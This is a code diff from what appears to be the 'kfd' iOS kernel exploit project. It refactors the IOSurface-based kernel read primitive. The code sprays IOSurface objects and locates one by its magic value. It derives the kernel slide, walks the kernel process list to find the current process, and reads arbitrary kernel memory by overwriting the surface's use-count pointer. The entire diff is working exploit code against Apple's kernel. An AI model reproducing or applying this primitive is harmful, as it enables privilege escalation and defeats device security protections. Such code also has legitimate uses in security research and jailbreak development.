@@ -25,7 +25,7 @@ u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr);
 
 void kread_IOSurface_init(struct kfd* kfd)
 {
-    kfd->kread.krkw_maximum_id = 0x4000;
+    kfd->kread.krkw_maximum_id = 0x1000;
     kfd->kread.krkw_object_size = 0x400; //estimate
 
     kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id) * (sizeof(struct iosurface_obj)));
@@ -51,9 +51,9 @@ void kread_IOSurface_allocate(struct kfd* kfd, u64 id)
 
 bool kread_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
 {
-    u32 magic = dynamic_uget(IOSurface, PixelFormat, object_uaddr);
+    u32 magic = *(u32 *)(object_uaddr + dynamic_info(IOSurface__pixelFormat));
     if (magic == IOSURFACE_MAGIC) {
-        u64 id = dynamic_uget(IOSurface, AllocSize, object_uaddr) - 1;
+        u64 id = *(u64 *)(object_uaddr + dynamic_info(IOSurface__allocSize)) - 1;
         kfd->kread.krkw_object_id = id;
         return true;
     }
@@ -213,7 +213,7 @@ u64 patchfind_kernproc(struct kfd* kfd, u64 kernel_base)
 
 void kread_IOSurface_find_proc(struct kfd* kfd)
 {
-    u64 textPtr = unsign_kaddr(dynamic_uget(IOSurface, isa, kfd->kread.krkw_object_uaddr));
+    u64 textPtr = UNSIGN_PTR(*(u64 *)(kfd->kread.krkw_object_uaddr + dynamic_info(IOSurface__isa)));
     
     struct mach_header_64 kernel_header;
     
@@ -245,21 +245,21 @@ void kread_IOSurface_find_proc(struct kfd* kfd)
     
     u64 kernel_slide = kernel_base - 0xFFFFFFF007004000;
     u64 kernproc = patchfind_kernproc(kfd, kernel_base);
-    kfd->info.kernel.kernel_slide = kernel_slide;
+    kfd->info.kaddr.kernel_slide = kernel_slide;
     
     u64 proc_kaddr = 0;
     kread((u64)kfd, kernproc, &proc_kaddr, sizeof(proc_kaddr));
-    proc_kaddr = unsign_kaddr(proc_kaddr);
-    kfd->info.kernel.kernel_proc = proc_kaddr;
+    proc_kaddr = UNSIGN_PTR(proc_kaddr);
+    kfd->info.kaddr.kernel_proc = proc_kaddr;
     
     while (proc_kaddr != 0) {
-        i32 pid = dynamic_kget(proc, p_pid, proc_kaddr);
+        u32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
         if (pid == kfd->info.env.pid) {
-            kfd->info.kernel.current_proc = proc_kaddr;
+            kfd->info.kaddr.current_proc = proc_kaddr;
             break;
         }
 
-        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
+        proc_kaddr = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
     }
 }
 
@@ -288,13 +288,14 @@ u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr)
     struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
     struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
     
-    u64 backup = dynamic_uget(IOSurface, UseCountPtr, iosurface_uaddr);
-    dynamic_uset(IOSurface, UseCountPtr, iosurface_uaddr, kaddr - dynamic_offsetof(IOSurface, ReadDisplacement));
+    u64 backup = *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr));
+    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr)) = kaddr - dynamic_info(IOSurface__readDisplacement);
     
     u32 read32 = 0;
     iosurface_get_use_count(krwObject.port, krwObject.surface_id, &read32);
     
-    dynamic_uset(IOSurface, UseCountPtr, iosurface_uaddr, backup);
+    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr)) = backup;
+    
     return read32;
 }
 
